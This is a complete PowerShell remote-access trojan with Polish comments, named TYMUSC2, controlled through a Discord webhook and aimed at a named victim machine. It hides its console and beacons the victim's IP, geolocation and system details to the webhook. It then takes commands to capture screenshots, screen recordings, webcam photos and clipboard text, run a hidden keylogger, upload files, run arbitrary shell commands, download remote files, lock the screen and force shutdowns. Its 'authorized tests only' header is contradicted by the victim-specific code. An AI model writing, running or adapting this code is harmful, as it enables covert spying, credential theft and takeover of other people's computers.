# ═══════════════════════════════════════════════════════════════════
# TYMUSC2 v1.0 - ZDALNE STEROWANIE PRZEZ DISCORD WEBHOOK
# TYLKO DLA AUTORYZOWANYCH TESTÓW BEZPIECZEŃSTWA!
# ═══════════════════════════════════════════════════════════════════

param(
    [switch]$Startup
)

# ===== KONFIGURACJA =====
$webhookUrl = "https://discord.com/api/webhooks/1512766627438133309/Ei7ZQANDz4QPN6W0BTFp3oEs6O1SCa4XvMX0XS8Yr42MiEuQXsWE1yQQutuYTuCteEuI"
$checkInterval = 5  # sekund między sprawdzeniami komend
$victimName = "MIKOLAJ-PC"
$dataDir = "$env:TEMP\tymushacker_data"

# Ukryj konsolę jak się odpali jako startup
if ($Startup) {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    '
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
}

# ===== FUNKCJE POMOCNICZE =====

function Send-DiscordMessage {
    param([string]$Content, [string]$File)
    $body = @{
        content = $Content
        username = "TYMUSC2 - $victimName"
    }
    try {
        if ($File -and (Test-Path $File)) {
            # Wyślij z załącznikiem
            $uploadUrl = "$webhookUrl?wait=true"
            $form = @{
                payload_json = $body | ConvertTo-Json
                file = Get-Item -Path $File
            }
            Invoke-RestMethod -Uri $uploadUrl -Method Post -Form $form -ErrorAction SilentlyContinue | Out-Null
        } else {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
        }
    } catch {}
}

function Get-LastCommand {
    # Pobiera ostatnią komendę z webhooka (last 10 messages)
    try {
        $messages = Invoke-RestMethod -Uri "$webhookUrl/messages?limit=10" -Method Get -ErrorAction SilentlyContinue
        if ($messages) {
            foreach ($msg in $messages) {
                if ($msg.content -match '^!') {
                    $cmd = $msg.content.Trim()
                    # Sprawdź czy to nie jest nasza własna wiadomość (od bota)
                    if ($msg.author.username -ne "TYMUSC2 - $victimName") {
                        return $cmd
                    }
                }
            }
        }
    } catch {}
    return $null
}

function Get-ComprehensiveInfo {
    $info = @{}
    
    # IP i lokalizacja
    try {
        $ipInfo = Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -ErrorAction SilentlyContinue
        $info.PublicIP = $ipInfo.ip
        $geo = Invoke-RestMethod -Uri "http://ip-api.com/json/$($ipInfo.ip)" -ErrorAction SilentlyContinue
        $info.Location = "$($geo.city), $($geo.regionName), $($geo.country)"
        $info.ISP = $geo.isp
        $info.Lat = $geo.lat
        $info.Lon = $geo.lon
        $info.Zip = $geo.zip
    } catch {}
    
    # System
    $info.ComputerName = $env:COMPUTERNAME
    $info.Username = $env:USERNAME
    $info.Domain = $env:USERDOMAIN
    $info.OS = (Get-WmiObject Win32_OperatingSystem).Caption
    $info.OSVersion = (Get-WmiObject Win32_OperatingSystem).Version
    $info.Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
    $info.LastBoot = (Get-WmiObject Win32_OperatingSystem).LastBootUpTime
    
    # Hardware
    $info.CPU = (Get-WmiObject Win32_Processor).Name
    $info.RAM_GB = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1)
    $info.GPU = (Get-WmiObject Win32_VideoController).Name
    
    # Dysk
    $disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"
    $info.DiskTotalGB = [math]::Round($disk.Size / 1GB, 1)
    $info.DiskFreeGB = [math]::Round($disk.FreeSpace / 1GB, 1)
    
    # Sieć - lokalne IP
    $info.LocalIPs = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress -join ", "
    $info.MAC = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object -First 1).MacAddress
    
    # Procesy
    $info.ProcessCount = (Get-Process).Count
    
    return $info
}

function Take-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
    $graphics.Dispose()
    
    $path = "$env:TEMP\screenshot_$([DateTime]::Now.Ticks).png"
    $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
    $bitmap.Dispose()
    return $path
}

function Start-Recording {
    # Rozpocznij nagrywanie ekranu (zapis klatek)
    $recordDir = "$env:TEMP\tymushacker_recording"
    if (-not (Test-Path $recordDir)) { New-Item -ItemType Directory -Path $recordDir -Force | Out-Null }
    
    $recordingFile = "$recordDir\recording_$([DateTime]::Now.Ticks).txt"
    Set-Content -Path $recordingFile -Value "RECORDING_STARTED:$([DateTime]::Now)"
    
    # Uruchom w tle proces nagrywania klatek
    $scriptBlock = {
        param($dir, $file)
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $frameNum = 0
        while (Test-Path $file) {
            $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
            $graphics.Dispose()
            
            $framePath = "$dir\frame_$frameNum.jpg"
            $bitmap.Save($framePath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
            $bitmap.Dispose()
            
            $frameNum++
            Start-Sleep -Milliseconds 100  # ~10 FPS
        }
    }
    
    $ps = [PowerShell]::Create()
    [void]$ps.AddScript($scriptBlock)
    [void]$ps.AddParameter("dir", $recordDir)
    [void]$ps.AddParameter("file", $recordingFile)
    [void]$ps.BeginInvoke()
    
    return $recordingFile
}

function Stop-Recording {
    param([string]$RecordingFile)
    if (-not $RecordingFile) { return $null }
    if (Test-Path $RecordingFile) { Remove-Item $RecordingFile -Force }
    
    # Czekaj chwilę na zakończenie procesu
    Start-Sleep -Seconds 2
    
    # Zrób zip z klatkami
    $recordDir = Split-Path $RecordingFile -Parent
    $zipPath = "$env:TEMP\recording_$([DateTime]::Now.Ticks).zip"
    
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($recordDir, $zipPath)
    
    # Wyczyść klatki
    Remove-Item "$recordDir\*.jpg" -Force -ErrorAction SilentlyContinue
    
    return $zipPath
}

function Execute-Command {
    param([string]$Command)
    
    $response = ""
    
    switch -Regex ($Command) {
        '^!info$' {
            $info = Get-ComprehensiveInfo
            $response = @"
**📡 FULL INFO - $($info.ComputerName)**
👤 **User:** $($info.Username)@$($info.Domain)
💻 **OS:** $($info.OS) ($($info.Architecture))
🆔 **Version:** $($info.OSVersion)
🌐 **Public IP:** $($info.PublicIP)
📍 **Location:** $($info.Location)
🏢 **ISP:** $($info.ISP)
📌 **Coords:** $($info.Lat), $($info.Lon)
🖥️ **CPU:** $($info.CPU)
🧠 **RAM:** $($info.RAM_GB) GB
🎮 **GPU:** $($info.GPU -join ", ")
💾 **Disk C:** $($info.DiskFreeGB)/$($info.DiskTotalGB) GB free
🔗 **Local IPs:** $($info.LocalIPs)
🔢 **MAC:** $($info.MAC)
⚙️ **Processes:** $($info.ProcessCount)
⏰ **Last Boot:** $($info.LastBoot)
"@
        }
        '^!ip$' {
            $ipInfo = Get-ComprehensiveInfo
            $response = "🌐 **IP:** $($ipInfo.PublicIP)`n📍 **Lokalizacja:** $($ipInfo.Location)`n🏢 **ISP:** $($ipInfo.ISP)`n📌 **Kordy:** $($ipInfo.Lat), $($ipInfo.Lon)"
        }
        '^!screenshot$|^!ss$' {
            $path = Take-Screenshot
            Send-DiscordMessage -Content "📸 **SCREENSHOT - $victimName**" -File $path
            Remove-Item $path -Force
            $response = "✅ Screenshot wysłany!"
        }
        '^!webcam$|^!cam$' {
            # Zrób zdjęcie z kamery (jeśli dostępna)
            try {
                Add-Type -AssemblyName System.Web
                $folder = "$env:TEMP\cam_capture"
                if (-not (Test-Path $folder)) { New-Item -ItemType Directory -Path $folder -Force | Out-Null }
                
                $comObj = New-Object -ComObject WIA.ImageFile -ErrorAction SilentlyContinue
                if ($comObj) {
                    $deviceManager = New-Object -ComObject WIA.DeviceManager
                    $device = $deviceManager.DeviceInfos | Where-Object {$_.Type -eq 2} | Select-Object -First 1
                    if ($device) {
                        $deviceInfo = $device.Connect()
                        $item = $deviceInfo.ExecuteCommand("{E813C0C4-C8A8-4F7A-9E6D-6A8BDE81A9B1}")
                        $path = "$folder\webcam_$([DateTime]::Now.Ticks).jpg"
                        $item.Transfer().SaveFile($path)
                        Send-DiscordMessage -Content "📷 **WEBCAM - $victimName**" -File $path
                        Remove-Item $path -Force
                        $response = "✅ Zdjęcie z kamery wysłane!"
                    } else {
                        $response = "❌ Brak kamery"
                    }
                } else {
                    $response = "❌ Brak dostępu do kamery (może wymagać admina)"
                }
            } catch {
                $response = "❌ Błąd kamery: $_"
            }
        }
        '^!startrecord$|^!record$' {
            $recFile = Start-Recording
            Set-Content -Path "$dataDir\current_recording.txt" -Value $recFile
            $response = "🎥 **Nagrywanie ekranu ROZPOCZĘTE!** Aby zakończyć użyj !stoprecord"
        }
        '^!stoprecord$|^!stop$' {
            $recFile = Get-Content "$dataDir\current_recording.txt" -ErrorAction SilentlyContinue
            if ($recFile) {
                $zipPath = Stop-Recording -RecordingFile $recFile
                if ($zipPath -and (Test-Path $zipPath)) {
                    Send-DiscordMessage -Content "🎬 **NAGRANIE - $victimName** ($([math]::Round((Get-Item $zipPath).Length/1MB,2)) MB)" -File $zipPath
                    Remove-Item $zipPath -Force
                    Remove-Item "$dataDir\current_recording.txt" -Force -ErrorAction SilentlyContinue
                    $response = "✅ Nagranie wysłane na Discorda!"
                } else {
                    $response = "❌ Błąd nagrywania"
                }
            } else {
                $response = "❌ Brak aktywnego nagrywania"
            }
        }
        '^!shell (.+)$' {
            $cmd = $matches[1]
            try {
                $output = Invoke-Expression -Command $cmd 2>&1 | Out-String
                if ($output.Length -gt 1900) {
                    $output = $output.Substring(0, 1900) + "...[PRZYCIĘTO]"
                }
                $response = "💻 **CMD:** `$ $cmd`n```$output```"
            } catch {
                $response = "❌ Błąd: $_"
            }
        }
        '^!ps$|^!processes$' {
            $procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 20
            $response = "⚙️ **TOP 20 PROCESÓW:**`n"
            foreach ($p in $procs) {
                $response += "• $($p.ProcessName) (PID: $($p.Id)) - CPU: $([math]::Round($p.CPU,1)) - RAM: $([math]::Round($p.WorkingSet/1MB,1)) MB`n"
            }
        }
        '^!kill (\d+)$' {
            $pid = [int]$matches[1]
            try {
                Stop-Process -Id $pid -Force
                $response = "✅ Proces PID $pid zakończony"
            } catch {
                $response = "❌ Nie udało się zabić procesu $_"
            }
        }
        '^!shutdown$' {
            $response = "⚠️ **WYŁĄCZANIE SYSTEMU ZA 10 SEKUND...**"
            Send-DiscordMessage -Content $response
            Start-Sleep -Seconds 10
            Stop-Computer -Force
            return
        }
        '^!restart$' {
            $response = "⚠️ **RESTART SYSTEMU ZA 10 SEKUND...**"
            Send-DiscordMessage -Content $response
            Start-Sleep -Seconds 10
            Restart-Computer -Force
            return
        }
        '^!msg (.+)$' {
            $msg = $matches[1]
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.MessageBox]::Show($msg, "⚠️ UWAGA!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning) | Out-Null
            $response = "✅ MessageBox wysłany: $msg"
        }
        '^!speak (.+)$' {
            $text = $matches[1]
            try {
                Add-Type -AssemblyName System.Speech
                $speech = New-Object System.Speech.Synthesis.SpeechSynthesizer
                $speech.Speak($text)
                $response = "🔊 Powiedziano: $text"
            } catch {
                $response = "❌ Błąd mowy"
            }
        }
        '^!voice (.+)$' {
            $text = $matches[1]
            # Syntezator mowy po polsku
            try {
                Add-Type -AssemblyName System.Speech
                $speech = New-Object System.Speech.Synthesis.SpeechSynthesizer
                $speech.Rate = -2
                $speech.Volume = 100
                $speech.Speak($text)
                $response = "🔊 Głos: $text"
            } catch {
                $response = "❌ Błąd"
            }
        }
        '^!download (.+)$' {
            $url = $matches[1]
            $fileName = [System.IO.Path]::GetFileName($url)
            if (-not $fileName) { $fileName = "download_$([DateTime]::Now.Ticks).exe" }
            $savePath = "$env:TEMP\$fileName"
            try {
                Invoke-WebRequest -Uri $url -OutFile $savePath -ErrorAction Stop
                $response = "✅ Pobrano: $fileName ($([math]::Round((Get-Item $savePath).Length/1KB,1)) KB)"
            } catch {
                $response = "❌ Błąd pobierania: $_"
            }
        }
        '^!upload (.+)$' {
            $path = $matches[1]
            if (Test-Path $path) {
                Send-DiscordMessage -Content "📁 **PLIK - $victimName** - $([System.IO.Path]::GetFileName($path))" -File $path
                $response = "✅ Plik wysłany na Discorda: $path"
            } else {
                $response = "❌ Plik nie istnieje: $path"
            }
        }
        '^!clipboard$|^!cb$' {
            try {
                Add-Type -AssemblyName System.Windows.Forms
                $clip = [System.Windows.Forms.Clipboard]::GetText()
                if ($clip.Length -gt 1000) { $clip = $clip.Substring(0, 1000) + "..." }
                $response = "📋 **SCHOWEK:**`n$clip"
            } catch {
                $response = "❌ Nie można odczytać schowka"
            }
        }
        '^!browse$|^!files$' {
            $dirs = Get-ChildItem -Path "C:\Users\$env:USERNAME" -Directory -ErrorAction SilentlyContinue
            $response = "📂 **KATALOGI UŻYTKOWNIKA:**`n"
            foreach ($d in $dirs) {
                $response += "📁 $($d.Name)`n"
            }
        }
        '^!dir (.+)$' {
            $dir = $matches[1]
            if (Test-Path $dir) {
                $items = Get-ChildItem -Path $dir -ErrorAction SilentlyContinue | Select-Object -First 30
                if ($items) {
                    $response = "📂 **ZAWARTOŚĆ: $dir**`n"
                    foreach ($item in $items) {
                        if ($item.PSIsContainer) {
                            $response += "📁 $($item.Name)/`n"
                        } else {
                            $response += "📄 $($item.Name) ($([math]::Round($item.Length/1KB,1)) KB)`n"
                        }
                    }
                } else {
                    $response = "📂 Katalog pusty: $dir"
                }
            } else {
                $response = "❌ Katalog nie istnieje: $dir"
            }
        }
        '^!keylog$|^!keys$' {
            # Uruchom keylogger w tle (zapis do pliku)
            $klPath = "$env:TEMP\keylog_$([DateTime]::Now.Ticks).txt"
            $klScript = @"
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class K {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
}
"@
`$log = "`$env:TEMP\keylog_temp.txt"
while(`$true) {
    for(`$i=1; `$i -le 255; `$i++) {
        `$state = [K]::GetAsyncKeyState(`$i)
        if (`$state -eq -32767) {
            `$key = [char]`$i
            Add-Content -Path `$log -Value "[`$(Get-Date -Format HH:mm:ss)] `$key"
        }
    }
    Start-Sleep -Milliseconds 10
}
"@
            Set-Content -Path "$env:TEMP\keylogger_runner.ps1" -Value $klScript
            Start-Process -FilePath "powershell" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\keylogger_runner.ps1`"" -WindowStyle Hidden
            Set-Content -Path "$dataDir\keylog_file.txt" -Value "$env:TEMP\keylog_temp.txt"
            $response = "⌨️ **Keylogger URUCHOMIONY!** Aby pobrać logi użyj !getkeylog"
        }
        '^!getkeylog$|^!getkeys$' {
            $klFile = Get-Content "$dataDir\keylog_file.txt" -ErrorAction SilentlyContinue
            if ($klFile -and (Test-Path $klFile)) {
                $content = Get-Content $klFile -Raw
                if ($content.Length -gt 1900) { $content = $content.Substring(0, 1900) + "...[PRZYCIĘTO]" }
                $response = "⌨️ **KEYLOG:**`n```$content```"
            } else {
                $response = "❌ Brak logów keyloggera. Użyj najpierw !keylog"
            }
        }
        '^!lock$|^!block$' {
            # Pokaż fullscreen blokadę jak TYMUSHACKER
            $scriptBlock = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
`$f = New-Object System.Windows.Forms.Form
`$f.WindowState = "Maximized"
`$f.FormBorderStyle = "None"
`$f.TopMost = `$true
`$f.BackColor = "Black"
`$f.KeyPreview = `$true
`$f.KeyDown += { param(`$s,`$e) `$e.SuppressKeyPress=`$true; `$e.Handled=`$true }
`$l = New-Object System.Windows.Forms.Label
`$l.Text = @"`n`n`n`n`n`n`n`n                ╔════════════════════════════════════════════╗`n                ║    SYSTEM ZABLOKOWANY PRZEZ TYMUSHACKER    ║`n                ║                                            ║`n                ║    Ten komputer został zdalnie przejęty     ║`n                ║                                            ║`n                ║    ✦ CZEŚĆ MIKOŁAJ! ✦                      ║`n                ║                                            ║`n                ║    Nie próbuj wychodzić - to niemożliwe    ║`n                ╚════════════════════════════════════════════╝`n"@
`$l.Font = New-Object System.Drawing.Font("Consolas", 16, [System.Drawing.FontStyle]::Bold)
`$l.ForeColor = "Red"
`$l.BackColor = "Black"
`$l.TextAlign = "MiddleCenter"
`$l.Size = New-Object System.Drawing.Size(1920, 1080)
`$l.Location = New-Object System.Drawing.Point(0, 0)
`$f.Controls.Add(`$l)
`$t = New-Object System.Windows.Forms.Timer
`$t.Interval = 50
`$t.Add_Tick({ `$f.TopMost = `$true })
`$t.Start()
[System.Windows.Forms.Application]::Run(`$f)
"@
            Set-Content -Path "$env:TEMP\tymushacker_lock.ps1" -Value $scriptBlock
            Start-Process -FilePath "powershell" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\tymushacker_lock.ps1`"" -WindowStyle Hidden
            $response = "🔒 **SYSTEM ZABLOKOWANY!** Aby odblokować użyj !unlock"
        }
        '^!unlock$' {
            try {
                Stop-Process -Name "powershell" -Force | Out-Null
                $response = "🔓 System odblokowany (próba zamknięcia procesów)"
            } catch {
                $response = "❌ Nie udało się odblokować"
            }
        }
        '^!open (.+)$' {
            $path = $matches[1]
            try {
                Start-Process $path
                $response = "✅ Otwarto: $path"
            } catch {
                $response = "❌ Nie można otworzyć"
            }
        }
        '^!chrome$' {
            try {
                Start-Process "chrome"
                $response = "✅ Chrome uruchomiony"
            } catch {
                $response = "❌ Nie można uruchomić Chrome"
            }
        }
        '^!type (.+)$' {
            $text = $matches[1]
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.SendKeys]::SendWait($text)
            $response = "⌨️ Wpisano: $text"
        }
        '^!alert (.+)$' {
            $text = $matches[1]
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.MessageBox]::Show($text, "⚠️ ALERT!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
            $response = "✅ Alert wysłany"
        }
        '^!help$|^!commands$' {
            $response = @"
**📜 LISTA KOMEND TYMUSC2:**

**INFORMACJE:**
`!info` - Pełne info o systemie
`!ip` - Publiczne IP + lokalizacja
`!ps` - Lista procesów
`!clipboard` - Schowek

**EKRAN I MULTIMEDIA:**
`!screenshot` / `!ss` - Zrzut ekranu
`!webcam` / `!cam` - Zdjęcie z kamery
`!record` / `!startrecord` - Nagrywaj ekran
`!stoprecord` / `!stop` - Zakończ nagrywanie

**SYSTEM:**
`!shell <cmd>` - Wykonaj komendę
`!kill <PID>` - Zabij proces
`!shutdown` - Wyłącz komputer
`!restart` - Restart komputera

**PLIKI:**
`!dir <ścieżka>` - Lista plików
`!upload <ścieżka>` - Wyślij plik na Discord
`!download <url>` - Pobierz plik na komputer

**PRANKI:**
`!msg <tekst>` - Pokaż message box
`!alert <tekst>` - Alert krytyczny
`!speak <tekst>` - Mów przez głośniki
`!voice <tekst>` - Mów po polsku
`!type <tekst>` - Wpisz tekst
`!open <ścieżka>` - Otwórz plik/program
`!chrome` - Otwórz Chrome

**BLOKADA:**
`!lock` - Blokada fullscreen
`!unlock` - Próba odblokowania

**KEYLOGGER:**
`!keylog` / `!keys` - Uruchom keylogger
`!getkeylog` / `!getkeys` - Pobierz logi
"@
        }
        default {
            $response = "❌ Nieznana komenda: $Command`nUżyj !help aby zobaczyć listę komend"
        }
    }
    
    return $response
}

# ===== GŁÓWNA PĘTLA =====
# Inicjalizacja
if (-not (Test-Path $dataDir)) { New-Item -ItemType Directory -Path $dataDir -Force | Out-Null }

# Wyślij informację o starcie
$startInfo = Get-ComprehensiveInfo
Send-DiscordMessage -Content @"
**✅ TYMUSC2 AKTYWNY - $($startInfo.ComputerName)**
👤 **User:** $($startInfo.Username)
🌐 **Public IP:** $($startInfo.PublicIP)
📍 **Lokalizacja:** $($startInfo.Location)
💻 **OS:** $($startInfo.OS)
📌 **Dostępne komendy:** !help
"@

# Główna pętla nasłuchiwania
$lastCommand = ""
while ($true) {
    try {
        $cmd = Get-LastCommand
        
        if ($cmd -and $cmd -ne $lastCommand) {
            $lastCommand = $cmd
            $response = Execute-Command -Command $cmd
            if ($response) {
                Send-DiscordMessage -Content $response
            }
        }
        
        Start-Sleep -Seconds $checkInterval
    } catch {
        Start-Sleep -Seconds 10
    }
}
